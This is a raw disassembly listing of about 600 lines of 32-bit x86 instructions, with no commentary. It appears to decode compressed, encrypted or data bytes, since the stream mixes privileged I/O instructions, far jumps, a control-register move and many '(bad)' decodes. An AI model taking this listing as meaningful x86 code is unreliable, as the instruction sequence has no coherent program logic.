  40b538:	add    DWORD PTR [edi],ebx
  40b53a:	cmp    DWORD PTR [edx-0x78],esi
  40b53d:	addr16 sbb eax,0xcf0b4dc6
  40b543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b544:	jl     0x40b5c1
  40b546:	fldenv [eax+0x35]
  40b549:	jge    0x40b525
  40b54b:	daa    
  40b54c:	aaa    
  40b54d:	in     al,0xdc
  40b54f:	mov    ds:0xd25a5628,eax
  40b554:	pop    DWORD PTR es:[ecx]
  40b557:	dec    esi
  40b558:	jo     0x40b5d7
  40b55a:	xchg   DWORD PTR [esi-0x2e32bbe0],eax
  40b560:	les    esi,FWORD PTR [edx+ebp*2-0x4087e860]
  40b567:	push   ebx
  40b568:	and    DWORD PTR [eax-0x3f],ecx
  40b56b:	or     ah,BYTE PTR [edx-0x45d6c81e]
  40b571:	jbe    0x40b4f4
  40b573:	retf   
  40b574:	jge    0x40b568
  40b576:	cmp    edi,DWORD PTR [edx+ebp*2]
  40b579:	adc    bh,BYTE PTR [eax+0x6d95e0dd]
  40b57f:	stos   BYTE PTR es:[edi],al
  40b580:	dec    ecx
  40b581:	pop    edx
  40b582:	xchg   ebp,eax
  40b583:	ja     0x40b5dc
  40b585:	test   al,0x31
  40b587:	out    0xee,eax
  40b589:	aaa    
  40b58a:	aad    0x17
  40b58c:	(bad)  
  40b58d:	fnsave [ebp-0x45]
  40b590:	xchg   DWORD PTR [ebx],edx
  40b592:	push   esp
  40b593:	mov    ecx,0x6585c4c3
  40b598:	cmp    al,0x36
  40b59a:	ret    0xd128
  40b59d:	test   DWORD PTR [eax-0x7b],ebx
  40b5a0:	mov    eax,ds:0x4ecc8762
  40b5a5:	nop
  40b5a6:	mov    edi,0x2906ec14
  40b5ab:	push   eax
  40b5ac:	dec    ebp
  40b5ad:	cld    
  40b5ae:	cmp    eax,0xcbcd931d
  40b5b3:	jb     0x40b586
  40b5b5:	or     al,0x12
  40b5b7:	retf   
  40b5b8:	repnz call 0xb9f8:0xd3abb859
  40b5c0:	daa    
  40b5c1:	lea    esp,[edi+ebp*1+0x299e2a70]
  40b5c8:	push   ds
  40b5c9:	cmp    BYTE PTR [edx+0x4537db13],bh
  40b5cf:	xor    BYTE PTR [eax-0x24b153be],0xe3
  40b5d6:	clc    
  40b5d7:	or     DWORD PTR [eax-0x38],ecx
  40b5da:	pop    edx
  40b5db:	pop    ebp
  40b5dc:	out    dx,al
  40b5dd:	out    0x45,eax
  40b5df:	or     al,0x78
  40b5e1:	pop    edi
  40b5e2:	fs aam 0x46
  40b5e5:	mov    ds:0xa9f23a03,eax
  40b5ea:	lods   eax,DWORD PTR ds:[esi]
  40b5eb:	fnsave [eax+0x7a242fee]
  40b5f1:	pusha  
  40b5f2:	inc    esi
  40b5f3:	sbb    eax,0xab4f1e9f
  40b5f8:	aad    0xd1
  40b5fa:	mov    esp,0xe1573603
  40b5ff:	jg     0x40b5e0
  40b601:	stc    
  40b602:	shr    DWORD PTR [ebx-0xba83964],1
  40b608:	jp     0x40b672
  40b60a:	jge    0x40b66e
  40b60c:	aad    0xd8
  40b60e:	xor    BYTE PTR [ebp+0x2f9b17ff],0xf3
  40b615:	mov    BYTE PTR [edi+0x73],ch
  40b618:	in     eax,0xa3
  40b61a:	pusha  
  40b61b:	push   esi
  40b61c:	jb     0x40b68f
  40b61e:	iret   
  40b61f:	cmp    DWORD PTR [ecx-0x350fe753],edx
  40b625:	cdq    
  40b626:	push   ebp
  40b627:	dec    ecx
  40b628:	adc    ch,BYTE PTR [ebx+0x70]
  40b62b:	or     cl,BYTE PTR [ecx-0x3]
  40b62e:	leave  
  40b62f:	sbb    al,0x5f
  40b631:	stc    
  40b632:	dec    edi
  40b633:	mov    edi,0xc25b499b
  40b638:	mov    bl,0x57
  40b63a:	or     bl,BYTE PTR [esi]
  40b63c:	es jo  0x40b6aa
  40b63f:	push   es
  40b640:	xchg   esp,eax
  40b641:	dec    edi
  40b642:	push   edx
  40b643:	mov    bl,0x83
  40b645:	or     esi,edi
  40b647:	clc    
  40b648:	jge    0x40b6ae
  40b64a:	gs pop ss
  40b64c:	sahf   
  40b64d:	xchg   esi,eax
  40b64e:	xor    esp,DWORD PTR [ebx+0x33]
  40b651:	jge    0x40b6ad
  40b653:	test   eax,0x9b14052c
  40b658:	sub    al,cl
  40b65a:	mov    ah,0x55
  40b65c:	jmp    0x4c81a5bc
  40b661:	fs pop ebx
  40b663:	ret    0xe250
  40b666:	ret    
  40b667:	sti    
  40b668:	xchg   edi,eax
  40b669:	div    DWORD PTR [eax]
  40b66b:	ss jo  0x40b6e4
  40b66e:	in     al,0xa6
  40b670:	neg    esp
  40b672:	mov    BYTE PTR [ebp+0x2f608870],ch
  40b678:	lods   eax,DWORD PTR ds:[esi]
  40b679:	nop
  40b67a:	and    ebp,DWORD PTR [eax+0x4b]
  40b67d:	sbb    al,BYTE PTR [ebx+eiz*4-0x3c]
  40b681:	xchg   ebp,eax
  40b682:	xor    ecx,DWORD PTR [ebx-0x4d]
  40b685:	dec    ecx
  40b686:	fistp  WORD PTR [ebx]
  40b688:	add    dl,BYTE PTR [edx+0x76]
  40b68b:	call   0xf260f388
  40b690:	xlat   BYTE PTR ds:[ebx]
  40b691:	xchg   ebp,eax
  40b692:	ret    
  40b693:	shr    DWORD PTR [eax+0x638a89f],1
  40b699:	ret    0x4c1
  40b69c:	adc    al,0x3e
  40b69e:	aas    
  40b69f:	mov    WORD PTR [edx+0x63],ss
  40b6a2:	scas   eax,DWORD PTR es:[edi]
  40b6a3:	cmc    
  40b6a4:	aaa    
  40b6a5:	mov    cl,0xe7
  40b6a7:	scas   al,BYTE PTR es:[edi]
  40b6a8:	mov    bl,0x4e
  40b6aa:	mov    al,0xe5
  40b6ac:	scas   eax,DWORD PTR es:[edi]
  40b6ad:	xor    al,0x72
  40b6af:	iret   
  40b6b0:	adc    BYTE PTR [edi+0x32],bl
  40b6b3:	imul   DWORD PTR [esi-0x80]
  40b6b6:	cmc    
  40b6b7:	push   0xbb26a0ec
  40b6bc:	retf   0x74bb
  40b6bf:	dec    esp
  40b6c0:	lds    edi,FWORD PTR [esi-0x6d]
  40b6c3:	pop    eax
  40b6c4:	popf   
  40b6c5:	dec    edx
  40b6c6:	mov    edx,0x687a5122
  40b6cb:	xor    DWORD PTR [ecx+ebp*4+0x1b],esp
  40b6cf:	mov    cl,0x8f
  40b6d1:	mov    dl,0xb6
  40b6d3:	sbb    esi,DWORD PTR [edx-0x8]
  40b6d6:	leave  
  40b6d7:	mov    ebp,0x85ccb2b9
  40b6dc:	xchg   ebx,eax
  40b6dd:	sar    dl,cl
  40b6df:	adc    eax,0x7c325ee7
  40b6e4:	cmp    eax,0x1236b4d0
  40b6e9:	xor    DWORD PTR [si-0x35],esi
  40b6ed:	retf   0xdf6
  40b6f0:	push   ebx
  40b6f1:	mov    dl,0xd7
  40b6f3:	jg     0x40b764
  40b6f5:	jecxz  0x40b75c
  40b6f7:	data16 mov ah,0xac
  40b6fa:	mov    eax,ds:0x90c50f4f
  40b6ff:	div    ecx
  40b701:	aas    
  40b702:	push   esp
  40b703:	inc    ah
  40b705:	and    DWORD PTR [ebp+ecx*8-0xcfea4fb],ecx
  40b70c:	xchg   edx,eax
  40b70d:	adc    DWORD PTR [ebp-0x27bb5ed4],esi
  40b713:	push   bp
  40b715:	sub    DWORD PTR [eax],eax
  40b717:	sbb    al,0x8f
  40b719:	adc    al,0x50
  40b71b:	push   edi
  40b71c:	xchg   ecx,esi
  40b71e:	pusha  
  40b71f:	dec    ebx
  40b720:	or     al,0xde
  40b722:	sbb    al,0xde
  40b724:	retf   0xc504
  40b727:	jns    0x40b6f7
  40b729:	lea    esi,[ebx]
  40b72b:	xchg   edx,eax
  40b72c:	test   BYTE PTR [esi-0x22],ch
  40b72f:	rcl    DWORD PTR [esi+0x19e6de2c],cl
  40b735:	jno    0x40b790
  40b737:	push   eax
  40b738:	push   ss
  40b739:	jns    0x40b726
  40b73b:	pushf  
  40b73c:	pusha  
  40b73d:	or     DWORD PTR [edx-0x78b8601d],ebp
  40b743:	lock mov bh,0x25
  40b746:	dec    edx
  40b747:	adc    BYTE PTR [ebx+0x63],0xde
  40b74b:	dec    ebp
  40b74c:	fs sbb al,ah
  40b74f:	outs   dx,DWORD PTR ds:[esi]
  40b750:	cmp    al,0x54
  40b752:	lea    esp,[edi-0x3dae36a3]
  40b758:	test   BYTE PTR [ecx+0x2e],ch
  40b75b:	cmp    BYTE PTR [edi+ecx*2],bh
  40b75e:	jmp    0x40b7b5
  40b760:	retf   0x5e92
  40b763:	mov    ch,0x2c
  40b765:	pop    ss
  40b766:	dec    eax
  40b767:	fistp  WORD PTR [eax]
  40b769:	pop    ebp
  40b76a:	mov    WORD PTR [esp+edi*2-0x1281d152],fs
  40b771:	dec    esp
  40b772:	aad    0x5c
  40b774:	mov    edx,0x46676b8d
  40b779:	repz out 0x3e,al
  40b77c:	lock sbb BYTE PTR ds:0x5a97532a,0xe5
  40b784:	mov    al,0x5e
  40b786:	repz mov dh,0x6f
  40b789:	add    al,BYTE PTR [edi]
  40b78b:	or     eax,0x5fc2c010
  40b790:	sbb    bh,dl
  40b792:	pop    edx
  40b793:	(bad)  
  40b794:	repz pusha 
  40b796:	mov    ?,WORD PTR [esi+0xec51912]
  40b79c:	popa   
  40b79d:	retf   
  40b79e:	mov    ecx,0x77a9c0b6
  40b7a3:	outs   dx,DWORD PTR ds:[esi]
  40b7a4:	pushf  
  40b7a5:	xchg   edi,eax
  40b7a6:	cwde   
  40b7a7:	push   cs
  40b7a8:	dec    edi
  40b7a9:	test   BYTE PTR [esi+0x7e5ef486],dl
  40b7af:	xlat   BYTE PTR ds:[ebx]
  40b7b0:	pop    ebp
  40b7b1:	or     eax,0x3820ad49
  40b7b6:	cld    
  40b7b7:	adc    eax,DWORD PTR [ecx+0x277cbaf0]
  40b7bd:	outs   dx,DWORD PTR ds:[esi]
  40b7be:	adc    eax,0x16ecbf25
  40b7c3:	and    al,0xf2
  40b7c5:	mov    WORD PTR [eax],gs
  40b7c7:	out    dx,al
  40b7c8:	xor    DWORD PTR [ecx+0x35],esp
  40b7cb:	inc    eax
  40b7cc:	jns    0x40b806
  40b7ce:	xlat   BYTE PTR ds:[ebx]
  40b7cf:	jbe    0x40b835
  40b7d1:	fsub   QWORD PTR [ebx-0x536ba393]
  40b7d7:	mov    ch,0xad
  40b7d9:	cmp    cl,dh
  40b7db:	(bad)  
  40b7dc:	je     0x40b80a
  40b7de:	jae    0x40b774
  40b7e0:	loop   0x40b80a
  40b7e2:	hlt    
  40b7e3:	cmp    al,0xb5
  40b7e5:	aam    0xc5
  40b7e7:	lock outs dx,BYTE PTR ds:[esi]
  40b7e9:	retf   0x866
  40b7ec:	jae    0x40b85f
  40b7ee:	not    DWORD PTR [esi]
  40b7f0:	imul   ebx,eax,0x15
  40b7f3:	cmp    DWORD PTR [esi+0x61],eax
  40b7f6:	loopne 0x40b7e4
  40b7f8:	and    BYTE PTR [edi-0x6f734673],dh
  40b7fe:	hlt    
  40b7ff:	xchg   ebx,eax
  40b800:	je     0x40b873
  40b802:	pop    edx
  40b803:	frstor [esi]
  40b805:	mov    ah,0x9
  40b807:	mov    al,0x9b
  40b809:	call   0xa5e52cf2
  40b80e:	sub    al,dh
  40b810:	mov    edx,0x31cb74ce
  40b815:	stos   BYTE PTR es:[edi],al
  40b816:	(bad)  
  40b817:	stc    
  40b818:	dec    esi
  40b819:	xor    edx,DWORD PTR [ecx]
  40b81b:	sub    edx,edi
  40b81d:	jbe    0x40b7cd
  40b81f:	pop    esp
  40b820:	iret   
  40b821:	xlat   BYTE PTR ds:[ebx]
  40b822:	adc    BYTE PTR [ebx],cl
  40b824:	sbb    ebx,DWORD PTR [ecx-0x9]
  40b827:	xlat   BYTE PTR ds:[ebx]
  40b828:	push   esp
  40b829:	lock pop esp
  40b82b:	nop
  40b82c:	das    
  40b82d:	push   esi
  40b82e:	into   
  40b82f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b830:	jmp    0x40b841
  40b832:	in     eax,dx
  40b833:	mov    dl,BYTE PTR [edx+0x9]
  40b836:	popf   
  40b837:	and    eax,eax
  40b839:	mov    edi,0x34912e29
  40b83e:	stos   DWORD PTR es:[edi],eax
  40b83f:	jbe    0x4b60362b
  40b845:	jae    0x40b7c9
  40b847:	in     eax,0x70
  40b849:	rcr    DWORD PTR [edx],1
  40b84b:	jo     0x40b80f
  40b84d:	jmp    0x40b7f8
  40b84f:	test   edx,esp
  40b851:	cmp    DWORD PTR [esi],0xdc86f813
  40b857:	(bad)  
  40b858:	(bad)  
  40b859:	ja     0x40b88f
  40b85b:	mov    ds:0xaf0caeeb,al
  40b860:	call   0xdc93c6c7
  40b865:	or     al,0x53
  40b867:	psubq  mm5,mm6
  40b86a:	mov    esi,0x2c27cbe9
  40b86f:	out    dx,al
  40b870:	int    0x71
  40b872:	fsubr  DWORD PTR [edi-0xd639f9a]
  40b878:	imul   eax,DWORD PTR ds:0xc54d2238,0x33b1930a
  40b882:	(bad)  
  40b883:	sbb    DWORD PTR [eax-0x7e],edi
  40b886:	dec    esi
  40b887:	loope  0x40b8eb
  40b889:	jb     0x40b8bf
  40b88b:	pop    ss
  40b88c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b88d:	shl    BYTE PTR [eax+0x64],0x3d
  40b891:	mov    ds:0x3c3c6fc6,eax
  40b896:	pop    ds
  40b897:	test   eax,0xe9898aef
  40b89c:	in     al,0xa2
  40b89e:	imul   edx,DWORD PTR [esi-0x26],0x62
  40b8a2:	out    dx,eax
  40b8a3:	nop
  40b8a4:	les    ebp,FWORD PTR [edi+ebp*1+0x3b35cd0b]
  40b8ab:	int    0xf0
  40b8ad:	sbb    eax,0xc8b0888d
  40b8b2:	mov    ch,0x8c
  40b8b4:	or     BYTE PTR [edx],bh
  40b8b6:	test   eax,0x6182309
  40b8bb:	pop    ss
  40b8bc:	ins    DWORD PTR es:[edi],dx
  40b8bd:	ret    
  40b8be:	call   FWORD PTR [ecx]
  40b8c0:	sbb    edx,DWORD PTR [edx-0x4320fc34]
  40b8c6:	scas   al,BYTE PTR es:[edi]
  40b8c7:	jbe    0x40b8e0
  40b8c9:	(bad)  
  40b8ca:	cmc    
  40b8cb:	and    ah,0x89
  40b8ce:	inc    ebp
  40b8cf:	or     DWORD PTR [edi-0x4180f386],ebx
  40b8d5:	and    edx,esi
  40b8d7:	imul   ebp,ebp,0x1f93737e
  40b8dd:	sti    
  40b8de:	xor    DWORD PTR [edx],0xffffff94
  40b8e1:	out    dx,eax
  40b8e2:	jl     0x40b868
  40b8e4:	fild   QWORD PTR [ecx]
  40b8e6:	daa    
  40b8e7:	mov    bh,BYTE PTR [edi+0x2e]
  40b8ea:	in     eax,dx
  40b8eb:	outs   dx,BYTE PTR ds:[esi]
  40b8ec:	test   edx,esp
  40b8ee:	das    
  40b8ef:	mov    ch,0xf7
  40b8f1:	push   ds
  40b8f2:	or     BYTE PTR [ebx],ch
  40b8f4:	enter  0xacb6,0x36
  40b8f8:	adc    al,0x12
  40b8fa:	mov    eax,0x800abc84
  40b8ff:	ins    DWORD PTR es:[edi],dx
  40b900:	push   ss
  40b901:	sub    BYTE PTR [edi],cl
  40b903:	mov    bh,0xbb
  40b905:	js     0x40b8ac
  40b907:	adc    DWORD PTR [ebx-0x74e2ecdf],ebp
  40b90d:	std    
  40b90e:	sub    eax,0x75a58f13
  40b913:	push   eax
  40b915:	xchg   ecx,eax
  40b916:	mov    cl,ch
  40b918:	sbb    dl,BYTE PTR [ecx]
  40b91a:	imul   esi,DWORD PTR [esi-0x53],0x13
  40b91e:	rol    DWORD PTR [ecx-0x9],cl
  40b921:	outs   dx,DWORD PTR ds:[esi]
  40b922:	(bad)  
  40b923:	loopne 0x40b94c
  40b925:	mov    ds:0x57436929,eax
  40b92a:	sbb    esp,ebx
  40b92c:	or     al,0x15
  40b92e:	push   0x12
  40b930:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b932:	add    ah,BYTE PTR [esi+ebp*2-0x5bdc9402]
  40b939:	stos   DWORD PTR es:[edi],eax
  40b93a:	jae    0x40b8bd
  40b93c:	push   eax
  40b93d:	out    dx,eax
  40b93e:	sub    eax,0x262e7df
  40b943:	dec    eax
  40b944:	je     0x40b8d3
  40b946:	or     BYTE PTR [ebp+0xc67c253],bl
  40b94c:	cmp    DWORD PTR [edx+edx*8+0x65],0xffffffbe
  40b951:	xor    DWORD PTR [eax-0x77048dc5],0x6
  40b958:	scas   al,BYTE PTR es:[edi]
  40b959:	and    al,0xc7
  40b95b:	or     al,0x7
  40b95d:	enter  0xdd7b,0x12
  40b961:	sub    edi,DWORD PTR [ebp+edi*4+0x66]
  40b965:	adc    eax,0xe047eca9
  40b96a:	mov    ds:0xfa0850fe,eax
  40b96f:	jno    0x40b93b
  40b971:	repnz xor eax,0x4da2f079
  40b977:	lea    edi,[esi-0x4cb384a0]
  40b97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b97e:	mov    cr5,eax
  40b981:	jno    0x40b903
  40b983:	aas    
  40b984:	aad    0x8
  40b986:	sub    BYTE PTR [esi],al
  40b988:	jmp    0x40b94e
  40b98a:	ja     0x40b923
  40b98c:	fadd   DWORD PTR [edx-0x77]
  40b98f:	push   esi
  40b990:	popa   
  40b991:	xchg   edx,eax
  40b992:	out    0xbf,al
  40b994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b995:	sbb    ebp,esp
  40b997:	sub    DWORD PTR [edx-0x146cde65],esi
  40b99d:	ror    dh,1
  40b99f:	test   al,0x5b
  40b9a1:	gs (bad) 
  40b9a3:	push   esp
  40b9a4:	jnp    0x40ba11
  40b9a6:	loop   0x40b9da
  40b9a8:	pop    edi
  40b9a9:	xlat   BYTE PTR ds:[ebx]
  40b9aa:	pop    ecx
  40b9ab:	sbb    bh,BYTE PTR [ebx-0x6043b990]
  40b9b1:	mov    eax,0x19b000c4
  40b9b6:	cwde   
  40b9b7:	dec    edi
  40b9b8:	inc    edi
  40b9b9:	xchg   ecx,eax
  40b9ba:	ret    
  40b9bb:	inc    edx
  40b9bc:	xchg   ebp,eax
  40b9bd:	outs   dx,DWORD PTR ds:[esi]
  40b9be:	and    BYTE PTR [esi],al
  40b9c0:	out    dx,al
  40b9c1:	jge    0x40b9e4
  40b9c3:	inc    eax
  40b9c4:	cmp    al,0xe8
  40b9c6:	lahf   
  40b9c7:	jg     0x40b99b
  40b9c9:	shl    BYTE PTR [eax+edx*1],1
  40b9cc:	scas   eax,DWORD PTR es:[edi]
  40b9cd:	mov    eax,ds:0x59048ee4
  40b9d2:	in     eax,0x7
  40b9d4:	outs   dx,BYTE PTR ds:[esi]
  40b9d5:	jp     0x40ba26
  40b9d7:	shr    BYTE PTR [ecx+0x11],cl
  40b9da:	jne    0x40b9bc
  40b9dc:	fild   QWORD PTR [edx-0x6e8a2f64]
  40b9e2:	mov    BYTE PTR [ebp-0x2e43cb2c],bh
  40b9e8:	push   ebx
  40b9e9:	inc    edx
  40b9ea:	(bad)  
  40b9ec:	and    BYTE PTR [edi-0x432fbd61],bl
  40b9f2:	mov    bl,0x76
  40b9f4:	ins    BYTE PTR es:[edi],dx
  40b9f5:	mov    WORD PTR cs:[ebx+0x1df241e1],ds
  40b9fc:	or     BYTE PTR [eax],0x2f
  40b9ff:	enter  0xbcfa,0xb4
  40ba03:	fdivr  st(3),st
  40ba05:	add    eax,ebp
  40ba07:	fwait
  40ba08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba09:	dec    edi
  40ba0a:	(bad)  
  40ba0b:	jns    0x40b9f0
  40ba0d:	mov    ds:0x587276c3,eax
  40ba12:	cmp    edi,DWORD PTR [eax]
  40ba14:	scas   al,BYTE PTR es:[edi]
  40ba15:	aaa    
  40ba16:	push   edx
  40ba17:	das    
  40ba18:	jns    0x40b99d
  40ba1a:	lock cmp esp,ebx
  40ba1d:	mov    WORD PTR [edx-0x18],ds
  40ba20:	bound  eax,QWORD PTR [ebp-0x28]
  40ba23:	sar    DWORD PTR [edx+0xb94280b],0x18
  40ba2a:	push   ss
  40ba2b:	ins    BYTE PTR es:[edi],dx
  40ba2c:	in     eax,0x4
  40ba2e:	jmp    DWORD PTR [edx-0x14]
  40ba31:	xor    eax,0x3376e93
  40ba36:	neg    DWORD PTR [edx]
  40ba38:	pop    ebx
  40ba39:	addr16 fcmovu st,st(4)
  40ba3c:	rol    BYTE PTR [edx+0x176fad3d],0x6b
  40ba43:	add    BYTE PTR [ebx+ebp*1+0x44dbf80c],0x71
  40ba4b:	mov    ds:0xfd9c893d,eax
  40ba50:	mov    bh,0x43
  40ba52:	into   
  40ba53:	jmp    0xc1358cbb
  40ba58:	cmp    al,0xbf
  40ba5a:	inc    ecx
  40ba5b:	pop    esi
  40ba5c:	mov    DWORD PTR [edx+0x62],edi
  40ba5f:	mov    bh,0x32
  40ba61:	rol    BYTE PTR [ebp+0x70d18f1e],cl
  40ba67:	pop    ebx
  40ba68:	or     al,BYTE PTR [edx+0x70]
  40ba6b:	rol    DWORD PTR [ebp+0x3a],cl
  40ba6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba6f:	cwde   
  40ba70:	sbb    bh,al
  40ba72:	test   DWORD PTR [ecx],ebx
  40ba74:	mov    ebp,gs
  40ba76:	inc    ebx
  40ba77:	loopne 0x40ba7e
  40ba79:	sbb    bl,BYTE PTR [ecx-0x4a365909]
  40ba7f:	loope  0x40bad8
  40ba81:	cwde   
  40ba82:	jmp    0x1743:0x71cf91b6
  40ba89:	xlat   BYTE PTR ds:[ebx]
  40ba8a:	sub    esp,DWORD PTR [eax]
  40ba8c:	ror    ebp,0x8f
  40ba8f:	pop    ss
  40ba90:	lock or ch,BYTE PTR [edi-0x4b3c940]
  40ba97:	scas   al,BYTE PTR es:[edi]
  40ba98:	dec    ebx
  40ba99:	sub    DWORD PTR [ecx+0x3f],0x70
  40ba9d:	jmp    0x40bafb
  40ba9f:	call   0x6488fb7b
  40baa4:	sbb    eax,0x8271ddf9
  40baa9:	out    dx,al
  40baaa:	(bad)  
  40baac:	inc    ecx
  40baad:	sub    DWORD PTR [ebp+0x145fe286],ecx
  40bab3:	stc    
  40bab4:	call   0x4d9b:0x541d897
  40babb:	inc    eax
  40babc:	jne    0x40ba86
  40babe:	sbb    BYTE PTR [ebp+edi*1+0x27],0xe9
  40bac3:	sub    DWORD PTR [ebp+0x69],ebp
  40bac6:	test   al,0x34
  40bac8:	out    0x48,al
  40baca:	test   DWORD PTR [edx+ecx*8],esp
  40bacd:	jmp    0xdf7c:0x4517727f
  40bad4:	jge    0x40bb4a
  40bad6:	or     DWORD PTR [ecx],0xffffffdc
  40bad9:	cmp    eax,0x355864ae
  40bade:	mov    cl,0x29
  40bae0:	mov    dl,0xb9
  40bae2:	jmp    DWORD PTR [edx]
  40bae4:	mov    bl,0xe3
  40bae6:	cmp    cl,ch
  40bae8:	inc    edx
  40bae9:	inc    ecx
  40baea:	mov    esp,DWORD PTR [ebp-0x68]
  40baed:	push   cs
  40baee:	mov    ecx,0x9c09d3e1
  40baf3:	fs dec ebx
  40baf5:	jmp    0x40baa0
  40baf7:	gs icebp 
  40baf9:	loope  0x40baf4
  40bafb:	sahf   
  40bafc:	add    eax,DWORD PTR [ecx]
  40bafe:	or     eax,0xd93a483e
  40bb03:	in     al,0x49
  40bb05:	pop    es
  40bb06:	mov    dh,0xca
  40bb08:	test   al,0x80
  40bb0a:	mov    bh,0x2e
  40bb0c:	inc    esp
  40bb0d:	push   ebx
  40bb0e:	xchg   BYTE PTR [eax],cl
  40bb10:	sar    BYTE PTR [edx+0xf],cl
  40bb13:	(bad)  
  40bb14:	push   esp
  40bb15:	jb     0x40bad7
  40bb17:	xchg   BYTE PTR [ebx],bh
  40bb19:	jp     0x40baed
  40bb1b:	mov    dl,0x7d
  40bb1d:	push   esi
  40bb1e:	aas    
  40bb1f:	das    
  40bb20:	fst    DWORD PTR [esi+0x7677633f]
  40bb26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb27:	push   ebx
  40bb28:	adc    al,0x4e
  40bb2a:	mov    ebx,0xeb34600a
  40bb2f:	mov    al,ds:0x8ce8434a
  40bb34:	mov    dl,BYTE PTR [eax]
  40bb36:	push   cs
  40bb37:	mov    edi,0xc26caaa
  40bb3c:	test   eax,0x92bee0d4
  40bb41:	in     eax,0x77
  40bb43:	in     eax,dx
  40bb44:	or     DWORD PTR [ebx],esp
  40bb46:	(bad)  [edi+0x1b]
  40bb49:	fdivr  QWORD PTR [ecx-0x5f]
  40bb4c:	imul   esi,DWORD PTR [ecx+ecx*2],0x5d465798
  40bb53:	mov    ebp,?
  40bb55:	popa   
  40bb56:	sub    al,BYTE PTR [esi+ebp*4+0x2a]
  40bb5a:	loope  0x40bbcc
  40bb5c:	out    0x47,eax
  40bb5e:	inc    ecx
  40bb5f:	outs   dx,DWORD PTR ds:[esi]
  40bb60:	pop    ds
  40bb61:	mov    WORD PTR [eax+0x78d5d8f9],ss
  40bb67:	inc    ecx
  40bb68:	(bad)  [eax*4-0x43155bb7]
  40bb6f:	leavew 
  40bb71:	mov    ds:0xd9810784,al
  40bb76:	lods   eax,DWORD PTR ds:[esi]
  40bb77:	loop   0x40bb13
  40bb79:	int3   
  40bb7a:	ins    BYTE PTR es:[edi],dx
  40bb7b:	jo     0x40bb1c
  40bb7d:	nop
  40bb7e:	retf   
  40bb7f:	std    
  40bb80:	dec    edx
  40bb81:	std    
  40bb82:	cli    
  40bb83:	lea    ecx,[ecx+edx*8]
  40bb86:	sbb    al,0x12
  40bb88:	(bad)  
  40bb89:	jmp    0x40bb20
  40bb8b:	dec    ebx
  40bb8c:	(bad)  
  40bb8d:	(bad)  
  40bb8e:	out    dx,eax
  40bb8f:	xchg   esp,eax
  40bb90:	sbb    bl,BYTE PTR [edx+0x38f1a5f0]
  40bb96:	iret   
  40bb97:	stc    
  40bb98:	cmp    al,0x5c
  40bb9a:	add    edi,DWORD PTR [ecx-0x7d71f5e7]
  40bba0:	cmp    DWORD PTR [esi+edx*4-0x2d],edi
  40bba4:	push   edi
  40bba5:	outs   dx,DWORD PTR ds:[esi]
  40bba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bba7:	fisubr WORD PTR [edi+0x66e0a56f]
  40bbad:	xchg   ebp,eax
  40bbae:	out    dx,al
  40bbaf:	and    ebp,edx
  40bbb1:	push   edi
  40bbb2:	cmp    al,dl
  40bbb4:	dec    ebp
  40bbb5:	sbb    DWORD PTR [eax],edx
  40bbb7:	cmp    ebx,esi
  40bbb9:	jae    0x40bbe6
  40bbbb:	pop    eax
  40bbbc:	mov    esi,0x8fbea491
  40bbc1:	call   0x8c59:0x27fb3433
  40bbc8:	lds    esi,FWORD PTR [ecx+eiz*2-0x7e]
  40bbcc:	pop    eax
  40bbcd:	dec    esp
  40bbce:	arpl   WORD PTR [edx+ecx*1-0x5e76c78d],sp
  40bbd5:	test   DWORD PTR [esi+ebp*8-0x2d68d5e6],ecx
  40bbdc:	inc    esp
  40bbdd:	stos   BYTE PTR es:[edi],al
  40bbde:	ficom  WORD PTR [ebp-0x3e]
  40bbe1:	mov    ds:0x76809df2,al
  40bbe6:	jns    0x40bc11
  40bbe8:	clc    
  40bbe9:	inc    ebx
  40bbea:	fwait
  40bbeb:	xor    eax,0xe970f16c
  40bbf0:	gs popf 
  40bbf2:	fidivr DWORD PTR [edx]
  40bbf4:	mov    eax,ds:0x256cece4
  40bbf9:	jp     0x40bc08
  40bbfb:	es pop edx
  40bbfd:	pop    edi
  40bbfe:	ror    dl,0xe7
  40bc01:	pop    ebp
  40bc02:	sar    eax,0xd5
  40bc05:	loope  0x40bc1a
  40bc07:	mov    BYTE PTR [esi+eax*8],al
  40bc0a:	mov    esi,0x1d6bfd15
  40bc0f:	jmp    0x40bbeb
  40bc11:	or     eax,DWORD PTR [ecx+0x4b49df0f]
  40bc17:	mov    eax,ds:0x7534e8c0
  40bc1c:	mov    ah,0xd8
  40bc1e:	not    BYTE PTR [edi]
  40bc20:	mov    esi,DWORD PTR ds:0xd66e2e16
  40bc26:	sub    ch,BYTE PTR [edx-0x231ce58a]
  40bc2c:	jg     0x40bc27
  40bc2e:	sbb    eax,0xb661b225
  40bc33:	jmp    0xcc6088c8
  40bc38:	adc    DWORD PTR [edx+0x3a],eax
  40bc3b:	iret   
  40bc3c:	xchg   edx,eax
  40bc3d:	xor    eax,0x707905b5
  40bc42:	daa    
  40bc43:	jnp    0x40bc47
  40bc45:	dec    edx
  40bc46:	inc    edx
  40bc47:	fistp  WORD PTR [ebp+edx*4+0x453ae7bc]
  40bc4e:	lods   al,BYTE PTR ds:[esi]
  40bc4f:	lea    ebp,[ebp-0x59]
  40bc52:	and    BYTE PTR [ebp-0x44],bh
  40bc55:	fwait
  40bc56:	pop    edi
  40bc57:	imul   edx,DWORD PTR [ebx+ecx*4],0xffffff90
  40bc5b:	sbb    DWORD PTR [ebx],ebx
  40bc5d:	int3   
  40bc5e:	add    al,0x12
  40bc60:	and    esp,eax
  40bc62:	xor    BYTE PTR [ebp+0x4aef9a16],ah
  40bc68:	ds pop ss
  40bc6a:	out    dx,eax
  40bc6b:	ja     0x40bca0
  40bc6d:	mov    cs,esi
  40bc6f:	sub    eax,0x40eed1a
  40bc74:	shr    BYTE PTR [ecx],cl
  40bc76:	pop    es
  40bc77:	inc    BYTE PTR [ecx+0x1b]
  40bc7a:	sbb    bh,BYTE PTR [edi]
  40bc7c:	out    0x19,al
  40bc7e:	push   eax
